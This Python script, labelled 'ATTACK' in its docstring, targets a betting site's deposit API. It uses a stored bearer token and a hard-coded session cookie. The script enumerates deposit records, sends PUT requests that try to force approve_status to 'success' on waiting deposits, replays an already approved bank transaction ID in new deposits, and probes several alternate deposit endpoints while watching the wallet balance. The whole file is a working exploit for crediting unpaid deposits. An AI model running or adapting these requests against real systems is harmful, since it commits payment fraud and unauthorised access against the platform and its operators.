#!/usr/bin/env python3
"""probe_put_approve.py — PUT /mb/deposit-transaction/{id} to approve waiting deposits.

   ATTACK: Use PUT to update approve_status or trigger auto-slip match.
   Known approved transaction_id=3d939de8 (SCB 50000) to replay.

   Also: GET player deposit list to enumerate all waiting IDs.
"""
import json, pathlib, requests, time, uuid

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json",
       "Cookie": f"AWSALB={AWSALB}"}

KNOWN_TX = "3d939de8-a02c-4d3b-9ae1-fa8737737cb5"   # approved 10000 SCB

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

# ── 1. GET player deposit list ────────────────────────────────────────────────
print("\n=== GET player deposits ===")
waiting_ids = []
for path in [
    "/mb/deposit-transaction",
    "/mb/deposit-transaction?limit=50",
    "/mb/deposit-transaction?skip=0&limit=50",
    "/mb/deposit-transaction?status=waiting",
    "/mb/deposit-transaction?approve_status=waiting",
    "/mb/deposit-transaction/me",
    "/mb/deposit-history",
]:
    r = requests.get(f"{MGAPI}{path}", headers=HDR, timeout=10)
    if r.ok:
        try:
            data = r.json()
            items = data if isinstance(data, list) else data.get("data", data.get("items", [data]))
            if isinstance(items, list) and items:
                print(f"  [!!!] GET {path}: {len(items)} items")
                for it in items[:20]:
                    dep_id = it.get("id", "")
                    status = it.get("approve_status", it.get("status", "?"))
                    amt = it.get("deposit_amount", it.get("amount", "?"))
                    print(f"    id={dep_id[:8]}  status={status}  amt={amt}")
                    if status == "waiting" and dep_id:
                        waiting_ids.append(dep_id)
        except Exception as e:
            print(f"  {path}: {r.text[:100]}")
    elif r.status_code not in (404, 405):
        print(f"  GET {path}: HTTP {r.status_code}: {r.text[:80]}")

# Hard-coded waiting IDs from previous probes
hardcoded_waiting = [
    "735079eb",   # probe_slip_replay deposit 1
    "7de181fb",   # probe_slip_replay deposit 2
    "1bf4e7f5",   # probe_slip_replay deposit 3
    "b31ce7fa",   # probe_slip_replay deposit 4
    "41e1504a",   # probe_slip_replay deposit 5
    "0a4a0619",   # probe_slip_replay deposit 6
    "a3929435",   # probe_signurl deposit
    "b0783e2e",   # vak_dep deposit
]

print(f"\nWaiting IDs collected: {len(waiting_ids)} from GET + {len(hardcoded_waiting)} hardcoded")
# Combine (full IDs from GET + partial from hardcoded)
all_waiting = list(waiting_ids) + [h for h in hardcoded_waiting if len(h) < 36]

# ── 2. PUT with match-slip + known transaction_id ─────────────────────────────
print("\n=== PUT approve attempts ===")

# Payloads to try
approve_payloads = [
    # Match-slip replay
    {"transaction_id": KNOWN_TX, "is_match_slip": True, "approve_status": "success"},
    {"transaction_id": KNOWN_TX, "matched_slip": True, "approve_status": "success"},
    {"match_slip_transaction_id": KNOWN_TX, "approve_status": "success"},
    # Direct approve
    {"approve_status": "success", "status": "success"},
    # Auto-slip trigger
    {"is_auto_slip": True, "slip_matched": True, "approve_status": "success"},
    # Deposit amount + success (server might recalculate)
    {"approve_status": "success", "deposit_amount": 1000.0},
]

for dep_id in (all_waiting[:5] if all_waiting else []):
    full_id = dep_id if len(dep_id) == 36 else dep_id + "-????-????-????-????????????"
    for pl in approve_payloads[:3]:  # Test first 3 payloads per deposit
        for svc, base in [("mgapi", MGAPI), ("bgapi", BGAPI)]:
            # Try with full ID if available
            test_id = dep_id if len(dep_id) == 36 else dep_id
            r = requests.put(
                f"{base}/mb/deposit-transaction/{test_id}",
                headers={**HDR, "Origin": "https://manage.vak88z2.com"},
                json=pl, timeout=10
            )
            if r.status_code not in (400, 401, 404, 405, 500):
                print(f"  [!!!] [{svc}] PUT {dep_id[:8]} {list(pl.keys())}: HTTP {r.status_code}: {r.text[:300]}")
                if r.ok and r.json().get("approve_status") in ("success", "approved"):
                    print(f"  [!!!!!!] DEPOSIT APPROVED! Checking wallet...")
                    time.sleep(1)
                    print(f"  wallet: {wallet()}")

# ── 3. Try full IDs from waiting_ids with all payloads ────────────────────────
print("\n=== Full ID deposits ===")
for dep_id in waiting_ids[:10]:
    for pl in approve_payloads:
        r = requests.put(
            f"{MGAPI}/mb/deposit-transaction/{dep_id}",
            headers={**HDR, "Origin": "https://manage.vak88z2.com"},
            json=pl, timeout=10
        )
        if r.ok:
            d = r.json()
            status = d.get("approve_status", d.get("status", "?"))
            print(f"  PUT {dep_id[:8]} {list(pl.keys())[:2]}: HTTP {r.status_code} status={status}")
            if status in ("success", "approved"):
                print(f"  [!!!!!!] APPROVED! wallet: {wallet()}")
                break
        elif r.status_code not in (400, 401, 404, 405):
            print(f"  PUT {dep_id[:8]}: HTTP {r.status_code}: {r.text[:100]}")

# ── 4. Replay KNOWN_TX in a new deposit creation ──────────────────────────────
print("\n=== New deposit with KNOWN_TX id ===")
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

for replay_pl in [
    # Exact replay — reuse approved transaction ID
    {"deposit_amount": 10000.0, "slip_image_url": f"replay_{KNOWN_TX}.jpg",
     "is_auto_slip": True, "transaction_id": KNOWN_TX,
     "payment_bank_information_id": BANK_INFO, "deposit_account_id": DEP_ACCT},
    # With match slip flag
    {"deposit_amount": 10000.0, "is_auto_slip": True, "is_match_slip": True,
     "match_slip_transaction_id": KNOWN_TX,
     "payment_bank_information_id": BANK_INFO, "deposit_account_id": DEP_ACCT},
]:
    r = requests.post(f"{MGAPI}/mb/deposit-transaction", headers=HDR, json=replay_pl, timeout=12)
    if r.ok:
        d = r.json()
        print(f"  HTTP 200 id={str(d.get('id',''))[:8]} status={d.get('approve_status','?')} "
              f"bal_after={d.get('balance_after_deposit','?')}")
        if d.get("approve_status") in ("success", "approved"):
            print(f"  [!!!] AUTO-APPROVED! wallet: {wallet()}")
    else:
        print(f"  POST replay: HTTP {r.status_code}: {r.text[:100]}")

# ── 5. /mb/deposit/add endpoint ───────────────────────────────────────────────
print("\n=== POST /mb/deposit/add ===")
add_payloads = [
    # Standard deposit add
    {"deposit_amount": 10000.0, "is_auto_slip": True,
     "payment_bank_information_id": BANK_INFO, "deposit_account_id": DEP_ACCT,
     "approve_status": "success"},
    # With transaction_id replay
    {"deposit_amount": 10000.0, "transaction_id": KNOWN_TX,
     "payment_bank_information_id": BANK_INFO, "deposit_account_id": DEP_ACCT},
    # Minimal
    {"amount": 10000.0, "bank_id": BANK_INFO, "account_id": DEP_ACCT},
]
for pl in add_payloads:
    for svc, base in [("mgapi", MGAPI), ("pbapi", PBAPI), ("bgapi", BGAPI)]:
        r = requests.post(f"{base}/mb/deposit/add", headers=HDR, json=pl, timeout=10)
        if r.status_code not in (404, 405):
            print(f"  [{svc}] POST /mb/deposit/add: HTTP {r.status_code}: {r.text[:200]}")
            if r.ok and r.json().get("approve_status") in ("success", "approved"):
                print(f"  [!!!] APPROVED via /deposit/add! wallet: {wallet()}")
                break

# Also try alternate add paths
for path in ["/mb/deposit/create", "/mb/deposit/submit", "/mb/deposit/confirm",
             "/mb/deposit/match", "/mb/deposit/match-slip"]:
    r = requests.post(f"{MGAPI}{path}", headers=HDR,
                      json={"deposit_amount": 1000.0, "payment_bank_information_id": BANK_INFO,
                            "deposit_account_id": DEP_ACCT, "transaction_id": KNOWN_TX},
                      timeout=8)
    if r.status_code not in (404, 405):
        print(f"  POST {path}: HTTP {r.status_code}: {r.text[:150]}")

print(f"\nwallet final: {wallet()}")
print("=== DONE ===")
